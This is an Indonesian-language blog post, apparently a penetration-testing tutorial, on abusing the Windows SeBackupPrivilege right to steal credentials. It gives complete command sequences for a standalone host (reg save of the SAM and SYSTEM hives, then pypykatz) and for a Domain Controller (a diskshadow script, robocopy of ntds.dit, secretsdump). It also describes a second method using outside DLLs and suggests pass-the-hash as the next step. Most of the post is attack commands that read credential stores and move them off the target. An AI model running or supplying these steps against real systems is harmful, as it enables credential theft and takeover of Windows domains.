---
title: '[Privilege Abuse] SeBackupPrivilege'
date: 2022-03-12 23:30:22 +0700
categories: [Privilege Escalation, Windows Privilege Escalation]
tags: [windows, persistence, privilege escalation, mimikatz]     # TAG names should always be lowercase
author: nairpaa
---

# SeBackupPrivilege

*Privilege escalation* kali ini didasarkan dengan user yang memiliki hak akses **SeBackupPrivilege**. Hak akses ini memungkinkan user membuat salinan *backup* sistem.

Jadi singkatnya, hak istimewa ini memungkinkan user untuk membaca file apa pun seperti file sensitif SAM atau file SYSTEM Registry file.

Dengan demikian, penyerang dapat memanfaatkannya untuk mendapatkan password administrator.

```powershell
# melihat hak akses user
PS> whoami /priv
```

![Melihat hak akses akun](/assets/img/posts/sebackupprivilege-abuse/1.png)

## Standalone Windows (Non-AD)

```powershell
# buat direktori sementara
PS> mkdir c:\Temp
PS> cd c:\Temp

# dapatkan file SAM dan SYSTEM untuk mendapatkan kredensial user pada sistem
PS> reg save hklm\sam c:\Temp\sam
PS> reg save hklm\system c:\Temp\system

# download file SAM dan SYSTEM ke linux
# dapatkan SAM password
➜ pypykatz registry --sam sam system
```

![extract sam file](/assets/img/posts/sebackupprivilege-abuse/2.png)

> NTLM hash yang didapatkan bisa digunakan untuk [Pass-The-Hash](http://localhost:4000/posts/pass-attack/#pass-the-hash-pth).
{: .prompt-note }

## Domain Contoller

Tidak seperti eksploitasi *standalone*, di Domain Controller kita perlu file **ntds.dit** untuk mengekstrak hash dengan **system hive**-nya.

Masalahnya file **ntds.dit** akan selalu digunakan ketika sistem berjalan. Hal ini membuat kita tidak bisa meng-*copy* file tersebut.

Untuk mengatasi permasalahan ini, kita perlu menggunakan fungsi **diskshadow**. Dengan menggunakan fungsi ini, kita dapat membuat salinan drive yang sedang berjalan.

### Method 1

```powershell
# buat file heyho.dsh
# file ini berisi perintah diskshadow untuk membuat salinan dari C: Drive ke Z: Drive dengan "heyho" sebagai alias.
➜ cat heyho.dsh                  
set context persistent nowriters
add volume c: alias heyho
create
expose %heyho% z:

# convert file agar scirpt compatible dengan mesin windows
➜ unix2dos heyho.dsh

# upload heyho.dsh ke windows target
PS> cd C:\Temp
PS> upload heyho.dsh

# jalankan diskshadow dengan script heyho.dsh
PS> diskshadow /s heyho.dsh

# copy file ntds.dit dan SYSTEM HIVE
PS> robocopy /b z:\windows\ntds . ntds.dit
PS> reg save hklm\system c:\Temp\system
PS> cd C:\Temp

# download ntds.dit dan SYSTEM HIVE ke linux
PS> download ntds.dit
PS> download system

# gunakan impacket untuk mengesktrak hash pada sistem
➜ secretsdump.py -ntds ntds.dit -system system local
```

![extract ntds.dit](/assets/img/posts/sebackupprivilege-abuse/3.png)


### Method 2

Download **SeBackupPrivilegeUtils.dll** dan **SeBackupPrivilegeCmdLets.dll** [di sini](https://github.com/giuliano108/SeBackupPrivilege).

```powershell
# upload file dll dan hyho.dsh ke windows target
PS> cd C:\Temp
PS> upload heyho.dsh
PS> upload SeBackupPrivilegeUtils.dll
PS> upload SeBackupPrivilegeCmdLets.dll
 
# import module dan jalankan diskshadow
PS> Import-Module .\SeBackupPrivilegeUtils.dll
PS> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS> diskshadow /s heyho.dsh

# copy file ntds.dit dan SYSTEM HIVE
PS> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
PS> reg save hklm\system c:\Temp\system
PS> cd C:\Temp

# download ntds.dit dan SYSTEM HIVE ke linux
PS> download ntds.dit
PS> download system

# gunakan impacket untuk mengesktrak hash pada sistem
➜ secretsdump.py -ntds ntds.dit -system system local
```

---

## Referensi

- https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
